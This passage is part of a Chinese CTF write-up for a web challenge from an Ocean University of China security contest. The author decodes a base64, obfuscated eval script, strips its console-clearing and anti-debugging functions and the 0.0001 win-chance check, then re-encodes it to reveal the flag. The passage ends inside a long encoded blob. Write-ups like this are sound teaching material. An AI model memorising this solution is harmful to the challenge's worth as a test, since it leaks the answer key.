src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240426151751006.png" alt="image-20240426151751006"></p><p>前两段是在JavaScript中为浏览器添加事件监听器。第一个事件监听器是在鼠标右键点击页面时阻止浏览器默认的上下文菜单弹出。第二个事件监听器是在按下键盘任意键时阻止浏览器默认的键盘事件。这两段代码主要的作用是阻止浏览器执行默认操作，可以用来定制特定的页面交互行为。这就是限制的原理。</p><p>第三段是一个eval里base64加密后的js源码，是这道题的关键点，既然都在html里，我们就把整个html复制下来，放到本地环境方便调试。</p><p>为了方便调试，我们删除其他没用的元素，再删除前两段的限制，只留下关键代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>爆率真的高<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-built_in">eval</span>(<span class="hljs-title function_">atob</span>(<span class="hljs-string">&quot;一大堆源码………………&quot;</span>))</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="开调！"><a href="#开调！" class="headerlink" title="开调！"></a>开调！</h3><p>把那一大段base64的js源码解密了，然后把这一坨js格式化了方便查看：<img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240426152709563.png" alt="image-20240426152709563"></p><p>大概审完一遍后只在136行找到了0.9999这个数据与题目提示的0.0001相对应。</p><p>那么就在html全局搜0.9999，断点打在这里，开始调试：</p><p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240426152937941.png" alt="image-20240426152937941"></p><p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240426153208920.png" alt="image-20240426153208920"></p><p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240426153214574.png" alt="image-20240426153214574"></p><p>发现走过_0x4d032d()函数的时候会在控制台打出干扰信息。</p><p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240426153639526.png" alt="image-20240426153639526"></p><p>发现_0x4d3fb4()函数是不断清空控制台的函数，这个也是我们的干扰。</p><p>综上，我们需要删除_0x4d032d()函数和_0x4d3fb4()<strong>所有的</strong>函数，并把0.9999删除，这样就能让程序只出flag，且不会清屏。我们将解密后的源码，删除这些东西后重新base64加密并放回eval中：</p><p>删除这两段：</p><p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240426154758220.png" alt="image-20240426154758220"></p><p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240426153951104.png" alt="image-20240426153951104"></p><p>删除0.9999：</p><p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240426154019599.png" alt="image-20240426154019599"></p><p>重新base64加密后放到eval里。</p><p>再打开浏览器看就有了：</p><p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240426180242686.png" alt="image-20240426180242686"></p><p>全源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>爆率真的高<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-built_in">eval</span>(<span class="hljs-title function_">atob</span>(<span class="hljs-string">&quot;ZnVuY3Rpb24gXzB4NGQ0NShfMHhkMWI2NTksXzB4YWQ3NmIpe3ZhciBfMHgyMjg0NGQ9XzB4MmE4MygpO3JldHVybiBfMHg0ZDQ1PWZ1bmN0aW9uKF8weDQ0MmU3MCxfMHgxYzM1OTgpe18weDQ0MmU3MD1fMHg0NDJlNzAtKDB4MTRmNSsweDFjYjcrLTB4MmZiZCk7dmFyIF8weDFmYzkzMz1fMHgyMjg0NGRbXzB4NDQyZTcwXTtpZihfMHg0ZDQ1WydSU25rVkknXT09PXVuZGVmaW5lZCl7dmFyIF8weDNlNWRkOT1mdW5jdGlvbihfMHgxY2QzMjEpe3ZhciBfMHgzZGU2MTQ9J2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5Ky89Jzt2YXIgXzB4MWMzNDcyPScnLF8weDFlMDNjMj0nJyxfMHg0NWI4YjE9XzB4MWMzNDcyK18weDNlNWRkOTtmb3IodmFyIF8weDU3YmVhZD0tMHg0M2UrLTB4NGQ5Ki0weDUrLTB4MSoweDEzZmYsXzB4MmM0YmY4LF8weGM2NjRhNyxfMHg1ODhlNTY9MHgzKi0weDc1ZisweDEqMHgyMDFkKy0weDgwKjB4MTQ7XzB4YzY2NGE3PV8weDFjZDMyMVsnY2hhckF0J10oXzB4NTg4ZTU2KyspO35fMHhjNjY0YTcmJihfMHgyYzRiZjg9XzB4NTdiZWFkJSgtMHg3YTQqLTB4NCsweDIxYjcrMHgxKi0weDQwNDMpP18weDJjNGJmOCooMHgyMWU3Ky0weDQ1MistMHgzKjB4OWM3KStfMHhjNjY0YTc6XzB4YzY2NGE3LF8weDU3YmVhZCsrJSgtMHhkNzcrMHgxYmE5Ky0weGUyZSkpP18weDFjMzQ3Mis9XzB4NDViOGIxWydjaGFyQ29kZUF0J10oXzB4NTg4ZTU2KygweGZkMSstMHgzMTgrMHgxMSotMHhiZikpLSgweDk4ZisweDEqMHgxYzgzKy0weDEqMHgyNjA4KSE9PTB4MWMyNCsweDIxMDArLTB4MioweDFlOTI/U3RyaW5nWydmcm9tQ2hhckNvZGUnXSgtMHgxNjIqLTB4MTgrMHhjMiotMHgxMystMHgxMWNiJl8weDJjNGJmOD4+KC0oLTB4MjQwYystMHgzNCotMHgxMisweDIwNjYpKl8weDU3YmVhZCYweDIyOGMrMHgzZDQrLTB4MjY1YSkpOl8weDU3YmVhZDoweDcqMHg0YzMrLTB4OTE2KjB4NCsweDMwMyl7XzB4YzY2NGE3PV8weDNkZTYxNFsnaW5kZXhPZiddKF8weGM2NjRhNyk7fWZvcih2YXIgXzB4MTA5ZmIzPS0weDE1NTQrLTB4MTRiNisweDJhMGEsXzB4NTQwNTQ0PV8weDFjMzQ3MlsnbGVuZ3RoJ107XzB4MTA5ZmIzPF8weDU0MDU0NDtfMHgxMDlmYjMrKyl7XzB4MWUwM2MyKz0nJScrKCcwMCcrXzB4MWMzNDcyWydjaGFyQ29kZUF0J10oXzB4MTA5ZmIzKVsndG9TdHJpbmcnXSgweDEqMHgyNzAxKzB4NjgqMHg0Ky0weDI4OTEpKVsnc2xpY2UnXSgtKC0weDEqMHgyMjhiKy0weDIqLTB4MTFkNCsweDExYiotMHgxKSk7fXJldHVybiBkZWNvZGVVUklDb21wb25lbnQoXzB4MWUwM2MyKTt9O3ZhciBfMHg0MDI5Zjg9ZnVuY3Rpb24oXzB4ZmIzNGVlLF8weDUzOTY4Yil7dmFyIF8weDU4OGUzNT1bXSxfMHg1MjM3N2M9MHgyZDQqLTB4NysweDdiYisweDEqMHhjMTEsXzB4NWIyZmNkLF8weDViNTVkYT0nJztfMHhmYjM0ZWU9XzB4M2U1ZGQ5KF8weGZiMzRlZSk7dmFyIF8weDFhY2E3Zjtmb3IoXzB4MWFjYTdmPTB4MWRhMSstMHgzMjYqLTB4NSstMHgyZDVmO18weDFhY2E3ZjwtMHgxN2E3KjB4MSstMHgxKi0weDE4MmYrLTB4MSotMHg3ODtfMHgxYWNhN2YrKyl7XzB4NTg4ZTM1W18weDFhY2E3Zl09XzB4MWFjYTdmO31mb3IoXzB4MWFjYTdmPTB4ZDlmKzB4ZWI0KzB4MyotMHg5NzE7XzB4MWFjYTdmPDB4MTM0ZSotMHgxKy0weDEqMHgxNDEzKzB4Mjg2MTtfMHgxYWNhN2YrKyl7XzB4NTIzNzdjPShfMHg1MjM3N2MrXzB4NTg4ZTM1W18weDFhY2E3Zl0rXzB4NTM5NjhiWydjaGFyQ29kZUF0J10oXzB4MWFjYTdmJV8weDUzOTY4YlsnbGVuZ3RoJ10pKSUoLTB4MTM4ZSotMHgxKy0weDI0OGIrLTB4NWZmKi0weDMpLF8weDViMmZjZD1fMHg1ODhlMzVbXzB4MWFjYTdmXSxfMHg1ODhlMzVbXzB4MWFjYTdmXT1fMHg1ODhlMzVbXzB4NTIzNzdjXSxfMHg1ODhlMzVbXzB4NTIzNzdjXT1fMHg1YjJmY2Q7fV8weDFhY2E3Zj0tMHhjNiotMHg2Ky0weDEqMHg5YWQrLTB4NTA5Ki0weDEsXzB4NTIzNzdjPTB4NTE4KzB4NTMqMHgxOSstMHhkMzM7Zm9yKHZhciBfMHgxMGRmMjA9MHhkNjYrMHgxYmViKzB4NWU3Ki0weDc7XzB4MTBkZjIwPF8weGZiMzRlZVsnbGVuZ3RoJ107XzB4MTBkZjIwKyspe18weDFhY2E3Zj0oXzB4MWFjYTdmKygweDg0OCstMHgxKi0weDU1OSstMHhkYTApKSUoLTB4NjRjKy0weDI2NSotMHg5Ky0weDU5KjB4MjkpLF8weDUyMzc3Yz0oXzB4NTIzNzdjK18weDU4OGUzNVtfMHgxYWNhN2ZdKSUoMHgxKjB4MTU2NysweGJkNSsweDIwM2MqLTB4MSksXzB4NWIyZmNkPV8weDU4OGUzNVtfMHgxYWNhN2ZdLF8weDU4OGUzNVtfMHgxYWNhN2ZdPV8weDU4OGUzNVtfMHg1MjM3N2NdLF8weDU4OGUzNVtfMHg1MjM3N2NdPV8weDViMmZjZCxfMHg1YjU1ZGErPVN0cmluZ1snZnJvbUNoYXJDb2RlJ10oXzB4ZmIzNGVlWydjaGFyQ29kZUF0J10oXzB4MTBkZjIwKV5fMHg1ODhlMzVbKF8weDU4OGUzNVtfMHgxYWNhN2ZdK18weDU4OGUzNVtfMHg1MjM3N2NdKSUoLTB4MjZlOCstMHgyZDkqLTB4OSstMHgyYiotMHg1NSldKTt9cmV0dXJuIF8weDViNTVkYTt9O18weDRkNDVbJ1pSUG52ZSddPV8weDQwMjlmOCxfMHhkMWI2NTk9YXJndW1lbnRzLF8weDRkNDVbJ1JTbmtWSSddPSEhW107fXZhciBfMHg1ZDFlMWU9XzB4MjI4NDRkWy0weDcwMSsweDIyYjErLTB4MTAqMHgxYmJdLF8weDVlOWYxZT1fMHg0NDJlNzArXzB4NWQxZTFlLF8weDNjOTViNj1fMHhkMWI2NTlbXzB4NWU5ZjFlXTtpZighXzB4M2M5NWI2KXtpZihfMHg0ZDQ1Wyd0dFVrengnXT09PXVuZGVmaW5lZCl7dmFyIF8weDVkMTkyMz1mdW5jdGlvbihfMHg0MDYyNWUpe3RoaXNbJ1ZiTmhKQSddPV8weDQwNjI1ZSx0aGlzWydXalNGTlUnXT1bMHgxKi0weDFiNjkrMHgxZCotMHhkZisweDM4MyoweGYsMHgyKi0weGZlKzB4MTUqMHgxYmQrLTB4MjI4NSwtMHgxKjB4MTU2NCsweDIzMWErLTB4ZGI2XSx0aGlzWydFZnNMbW4nXT1mdW5jdGlvbigpe3JldHVybiduZXdTdGF0ZSc7fSx0aGlzWydOQk1qWm4nXT0nXHg1Y3crXHgyMCpceDVjKFx4NWMpXHgyMCp7XHg1Y3crXHgyMConLHRoaXNbJ3FIRnl6cyddPSdbXHgyN3xceDIyXS4rW1x4Mjd8XHgyMl07P1x4MjAqfSc7fTtfMHg1ZDE5MjNbJ3Byb3RvdHlwZSddWydrVE13R1InXT1mdW5jdGlvbigpe3ZhciBfMHgyODMxY2E9bmV3IFJlZ0V4cCh0aGlzWydOQk1qWm4nXSt0aGlzWydxSEZ5enMnXSksXzB4OGU5ZDI2PV8weDI4MzFjYVsndGVzdCddKHRoaXNbJ0Vmc0xtbiddWyd0b1N0cmluZyddKCkpPy0tdGhpc1snV2pTRk5VJ11bMHgxZDAxKzB4MioweDIwKy0weDkwKjB4MzRdOi0tdGhpc1snV2pTRk5VJ11bMHhjOCotMHgyKy0weDIxNTcrMHgyMmU3XTtyZXR1cm4gdGhpc1sncXB5dVNVJ10oXzB4OGU5ZDI2KTt9LF8weDVkMTkyM1sncHJvdG90eXBlJ11bJ3FweXVTVSddPWZ1bmN0aW9uKF8weDExYjMyNyl7aWYoIUJvb2xlYW4ofl8weDExYjMyNykpcmV0dXJuIF8weDExYjMyNztyZXR1cm4gdGhpc1snTUNUbGliJ10odGhpc1snVmJOaEpBJ10pO30sXzB4NWQxOTIzWydwcm90b3R5cGUnXVsnTUNUbGliJ109ZnVuY3Rpb24oXzB4MmQ4NGNmKXtmb3IodmFyIF8weGU1MzlmPS0weGYxZSsweDEqMHgxZjliKy0weDEwN2QsXzB4MzJmMGQ1PXRoaXNbJ1dqU0ZOVSddWydsZW5ndGgnXTtfMHhlNTM5ZjxfMHgzMmYwZDU7XzB4ZTUzOWYrKyl7dGhpc1snV2pTRk5VJ11bJ3B1c2gnXShNYXRoWydyb3VuZCddKE1hdGhbJ3JhbmRvbSddKCkpKSxfMHgzMmYwZDU9dGhpc1snV2pTRk5VJ11bJ2xlbmd0aCddO31yZXR1cm4gXzB4MmQ4NGNmKHRoaXNbJ1dqU0ZOVSddWzB4MTgxOCsweGYqMHgyODQrLTB4MTQ5YyoweDNdKTt9LG5ldyBfMHg1ZDE5MjMoXzB4NGQ0NSlbJ2tUTXdHUiddKCksXzB4NGQ0NVsndHRVa3p4J109ISFbXTt9XzB4MWZjOTMzPV8weDRkNDVbJ1pSUG52ZSddKF8weDFmYzkzMyxfMHgxYzM1OTgpLF8weGQxYjY1OVtfMHg1ZTlmMWVdPV8weDFmYzkzMzt9ZWxzZSBfMHgxZmM5MzM9XzB4M2M5NWI2O3JldHVybiBfMHgxZmM5MzM7fSxfMHg0ZDQ1KF8weGQxYjY1OSxfMHhhZDc2Yik7fXZhciBfMHg0MmQ2NTM9XzB4NGQ0NTsoZnVuY3Rpb24oXzB4M2RlOTU4LF8weDJiOTc3OCl7dmFyIF8weDVhOTJjYT1fMHg0ZDQ1LF8weDUzODRhNj1fMHgzZGU5NTgoKTt3aGlsZSghIVtdKXt0cnl7dmFyIF8weDFiNTVkOD1wYXJzZUludChfMHg1YTkyY2EoMHgyMWQsJyZoZV4nKSkvKC0weGU1OCsweDIqLTB4MTFlZisweDMyMzcqMHgxKStwYXJzZUludChfMHg1YTkyY2EoMHgyMTYsJzAzQXcnKSkvKC0weDJiMyotMHgxKzB4MTQqMHgyMistMHg1NTkpK3BhcnNlSW50KF8weDVhOTJjYSgweDIwZiwnQGwqZCcpKS8oMHgyKi0weGQyMisweDEqLTB4ZTAzKzB4Mjg0YSkqKC1wYXJzZUludChfMHg1YTkyY2EoMHgxZmYsJzFNYzAnKSkvKC0weDE4M2YrLTB4MjMwKy0weDI1Ki0weGI3KSkrcGFyc2VJbnQoXzB4NWE5MmNhKDB4MjI2LCc2eGIkJykpLygweDFmKi0weDFmKzB4MjFiZSstMHg4OSoweDM4KSoocGFyc2VJbnQoXzB4NWE5MmNhKDB4MjA2LCcmSHRbJykpLygtMHgxKjB4NGIzKy0weGQwNSstMHg4ZGYqLTB4MikpK3BhcnNlSW50KF8weDVhOTJjYSgweDFmMCwnaTFubycpKS8oMHgyMDM0Ky0weGRmOCstMHgxMjM1KSstcGFyc2VJbnQoXzB4NWE5MmNhKDB4MjE4LCd3QTh0JykpLygtMHgxZjFmKy0weDExOGMqLTB4MSsweGQ5YikqKHBhcnNlSW50KF8weDVhOTJjYSgweDIwMCwnQWRBRicpKS8oMHhhOTArMHhhNjEqLTB4MSstMHgyNikpK3BhcnNlSW50KF8weDVhOTJjYSgweDIyMiwnZUZVOScpKS8oMHgxYmMwKzB4MjkqMHg5MistMHgyMjEqMHgxOCkqKHBhcnNlSW50KF8weDVhOTJjYSgweDFmNywneXN6VicpKS8oLTB4MjM4MystMHgxZWZjKzB4NDI4YSkpO2lmKF8weDFiNTVkOD09PV8weDJiOTc3OClicmVhaztlbHNlIF8weDUzODRhNlsncHVzaCddKF8weDUzODRhNlsnc2hpZnQnXSgpKTt9Y2F0Y2goXzB4MjRlMmEzKXtfMHg1Mzg0YTZbJ3B1c2gnXShfMHg1Mzg0YTZbJ3NoaWZ0J10oKSk7fX19KF8weDJhODMsLTB4YTZhMzUrMHgxZmQ5KjB4NDkrMHgxKjB4ODM0NzEpKTtmdW5jdGlvbiBfMHgyYTgzKCl7dmFyIF8weGViODk0Nz1bJ2U4azBFM1JjU1cnLCdXNGUxJywnVzVxQicsJ1c2L2RTcScsJ2ZYTE9jOG9XeW1rZUJTa0tlU2tCQVcnLCdXNkR2V1IzZEhhYmxyOGt2VzQvZEg4aytXN3knLCdobW9FVzVPN0N0NG1EOGs0bUtpJywnRThrNXZhJywnV1FSY1Y4b0FXNEJkUDhrOWtyTmRVQ29nQjhvaFdRbGNMdXRjT3ZqeVc0cGRIQ29VRUNvV1dPT3VsWkZjUk1yNldRRENXN0ZkU0lwZElMbGRIbW8yam1rK2Zta0ZXUUZkSk5GY0dHdGRNcWRkTUNvVWtNMXdXT3llQzBHZmhZUmRRWDVnVzVmelc2RmNPTGZkbDhrNEVDb29XNXo0dThrZ1dQMHpxdlBxeElxeFdSWGVvOG9SV1F4ZEhLdGNUSmRkSjhvMmk4a1N5eDVFbmJ2ZWY4a2RiU2tHVzZ4Y0h1WHl6bW9uV1A1c3JDa1liMmZweFNrNFc0eGRVU29EVzZpVHdTbzhXNk9NZ3dKY0h1VmNUU29wcDBCY1RoUmNIWkhaVzRiYmwwWmNNTFQwVzUvY01MRG9XUldkV1JsY1FDa3hXUWxjSFNvWXZDa0xXUFNYVzVUd1c2ZGNJSXBjUDhvM2J0NVdDQ2tLbkNvRnNDb2tXNkN4V1JkZFZTb3dXNGZIVzQ5SGRTa3FXNUNVV1J4ZFJta05FQ29PVzdDSVdQT0FXUDlyVzU1SWdtb3d2bWtZVzZOZElxaWJXUk5kSW1vb1dQcGRKU28waWFSY1NneGNWQ2tvRW1vd1c2cjdrTDFKV1FtSVdRZThXT2xkTWc3ZEp4T1BlU29BRk1GY0lYcm9nOGtRVzZ1M1c1eGRNOGtaVzU0UWZDbzFXNEdjV1JaY1Zta3NBQ2t0VzU5T0M4azFxU2s2V09tQVc2VGNXNGkyZFNvNnltb2VuczFaQkNrVVdPUmRLOG9IV1FDa1c1ZGNKbWt3dWJsY1MyQmRUMHBkUVNrSVdPQmRPQ29ORThrQnZZRmNLYWZ2VzZ1VFdSWENXNzQrRXdmd1dSeGNOQ2tPbW1vTXNDbzh6U28zczJsY00zcUdXUVZkU0pGY1ZDb21FQ2tLY05oZFFDb1JXT0JkS0NvK1c1UmRUdFpkVXVQenhxck5XNWRkTDhvREJjeW1XNE5kUjAvZEpDb2xXT2J5ZzhvVnBYN2RIRzdkVm1rVWdDb25kQ29XenZ4ZE5OeGNVc0hpYUloZEdDb0VXNkpjVENrb1dQTmNPQ282QjhrYmZJNE94Q29ucFNvVHVlcm1pbW8wV1BkZEcxbU1XNnZ2V1A3Y1VicUFwOGtOVzR5V3c4a25XNU5kSmgzZE9IM2RSSGE5VzZyelc1UzVXNHlIVzdHbVdScVpuU2tSbmdOY084a2F3OGtyV09uTldROGdXUFdxVzRua1dRWCtXN3lhVzRHc1c0SGVXUnZrVzU0SGdHOHVyOG9XV09iRldSN2RUOGtnYVo1cHRDa3JhZnBkUFdsZE9Tb2NoOGtCVzREaVdPZTNyU2sveW1vZ2tHRmRKQ2syQm1vZFdRVmNRbW9xVzZpM2licGNPU2tCem1remhHUHFXNWorVzVHUWlxMGdiSUtrVzZ4ZFVKWGJXNXY4VzRlUFc1ZS93d25UVzVaZExtb0lXT2RkVXM0cVc1NGdibWtLV1EvY0dDazBCQ296bkNrbFdRQmNSdk9nVzcvZEg4b1BrOG9zV096bVc3dGRVTU5jVENrQUZ3U3lXUnRkUG1vaEZLbTNXNnRjUFNraUQwUmNQZU5kR0NvbGpmSDZyc0dleVovZFNta2RiSUw2VzVSY1FJbGNNcVhQb3JGZFBTa1RXTy9kUThvdldRdkRXUnhjTk1aY0hkUHNFTXZaYjNWZE9jeGNQdE5kSTA4aldRSmRTMVh0dFl6Vlc0NWpXUUJjSlg4dkFTa0hXNjlKVzU3Y1BDb2NiU2swVzd5QXNieGRLZEhBVzRKZFZtb2ttQ2tmV1JkY0xDa3lXUDdkR0NvRnl0RmRSdDNkTlp0Y1NDb2dtc21LRHVwZEdta1dxOG9rV1BtUVc0VmNOSm1tRG1vdGpOYWdXNi9jTG1rWFdQM2NOYVZjVVNvWlc0VmNJdzhkV1FpU3RDa1lqVzNjUU1mSFdROUhwSzg2VzZIQldQcUNzTmlNVzZQUFc1bGRIbW9ocm1vRFdQYVZyOGtyV094ZEp4M2RRQ295VzUzZFV4bkVXT0ZkSWZqOHE4b0ZXNi9jUUNvNVc2R2hpWG5ZV09aY1F3T1JXUG13VzZ6WFc3ZmZnbW9Rd0tkY09Da3BwQ2tJV1JPSm1ZOG9qOGtEVzVoY1BTb3NkOGtYV1BtNVdRQ3ZyYlJkTVptOVdSdGNQU29sVzRaY0p4RFFpWXBjVThrcWdMWmNHY1BEbDhvUHE4by9vcXZYcUNrR1dRbWRXT2Jkclg4dWhTb25EbWs1anRXRHM4b0p4Q2tjejFtN1dSM2RNS1N1ZlpwY1Q4a1JXUWl2cVhyT1c3UmRJQ29sV083Y1BKL2NWOG9vVzUzY084a01XN2lyYUNvL1dPSmNMMERmV1JoZExodVl2WmJXVzc3Y1Y4a1FxbW9PVzZXdFc2T0FxSUpkRzhvYVdQWmRSWTdjT0NrK1dSSmNUSVZkSGFEd2Nta1ZxWldwYm1rS1dPL2RVMEN5eENrNGF4WEhCbW9FcDEzY1Q4b2xXUGxjVUNrc2F1NEdXN3F2V1JiT1c3TytXUHBjSkw5dFc2ekpyV3RjVXJxVWR1cGRRSUZjSTN6VVdRaGNQMHhkVmRoY0xta0l4Q29YQ2VOY1AyTFZXT0ZjUGE4QVdQakRiOG9uV1I5Rm1jVDZXNDNkSThrQVdRYWl2Q29JeFNvbXY4a2V6Q29DV1BqSlc2YUNXNjNkTFNraHNKbWtXNEZkSjhrcVdSQmRHMTdkTVNvRHE4b2VXUWVBdThrOGpLQmRIOGtoV1FaZFRZRE93dW5KV1JCZElNR095V2RkVm1rRG9YZGNTbWtUVzdaZEkyZGRVM2xjTG1rTVdQL2NLOGtQVzU0dVc2ZGRIQ283VzVDY3JTazhXUEN5VzZGZFZDb3RXT0JjT1NrR0Y4a3d2YW5zVzdoZFQyWmNVZjkzV1BGZFVDa3pwdFZjS0tlSWYwdGNWWUdNV1BIQnJta1NXUHRkTm1vTldRYktXUWV5V1BxeFdPMGNXUWxjTkNreVc2M2RMOG9PVzZKZFFmQmRRU29SVzZiNm5lRmNPaFZkTVNvOWUzZktXNXRjUVcvY09TbzhXNDdkSkNvc1dPWmRMSHFBdDhrbG8wRmRIU2thV09qZVc0ZmpXNHBkSThraVdRL2RLU295VzRwZFNTbzVXUFJkTEhWZE5XR0VXNEduV1BISVc3QmRSSURHdkNvQnd0eGRJbW9ZV1E3ZElTb1BrMTNkTHFqUldPS0RlU2t1V1BOZFNTb1hXUmU0dTMxd0ZYNUhvQ29EaW1rSVc2Ym9kS2xkSzhvbGF0bGNLbW8xV1AwR1c3cGRNR2puRThvcGVXQmRPMEJkTVNvbEN1R0tXUER0VzdyUFc2VENXNjFVV1BDaFdPM2NUTFZkSm1vdFdQbU9XT1ZkUk5aZFRTa2t0aHRkVllaZEttay95U2tZYThvZldPRHRXT3VhcXZOY09tb2VXN1pjSVNrVlc3OEdjM3pzV08wV1c3THFXNVR5VzVLSXAxL2NWS3BjVm1vTFc2aGNPU2tQVzYxYWl3M2NMR0JkSkNrRXJJTmNOU2tRVzU4U29TbytXNlJkTDhrdldRbmtXUnpmV090ZEttazZrQ283VzZMaFdSSmNIZ0t5VzVIMVc0aGNVbWtGbThvVFc0blFGQ2tWVzZPTnRTa2tuTnZFV1AzY0dTb2FXN2RkU21vL1c3YjVXTzRCV1F0Y1BZcGRIZ3VhaExEcnloM2NSU29GVzdOZEplZGRHV0h5QVNvUENjTmRUOG9ZV095enZ1M2NVc1NBQndkY1BDa1NXTzl3bVNvMUVlenBXN25zV1BWZExTa2p1Q2tyVzc3Y014aGNLbWsvYk5ycGhTa0FXUjRtQU00VUJtb2ZXNGRjTkNrVFdSZlF0V2F2Vzd5eGtTa2xqU2t1d0hWZFRDbzRDdTE1dnQzZFVnVmNPbWtHblNrZ2xOaGRMYUJkU21vR3pDa01GQ29aV09OY0sybGNKZGhkUzBtR1dRbGNNbW9ja0o1c2dDazlsSFJjTjhveGJDa3BXTzVNVzZEWVc2SFRhU29CeDJ0ZFBta3RuOG9EY0poY0lDa2xld3BjVHVoZE44b0dpOG9naVlmWHJtb3VXT2xkTXZCY0dkRmNTbWs2a21vRVdQMW9XUnZNbDJGY1RMSmNKZjBNV09XcldSM2NWU294c0NraldSNHVXUldrcVNvQ1dQOU54OGtJdTB0Y0phaTlXUTlxV1BUamk4a21XNVREV090Y0pjOVd2ZFgydENrMlc3djJoVzdjUnNlK3Zta1lXNGhkUDhvM1dScjN0U285V1EzY0s4a21XNVR0VzQzY09iUmNUQ28vVzY4M3pDb1ViU2tHV1BoY1Vtb2pXUHViVzdCZEdTa1pXNE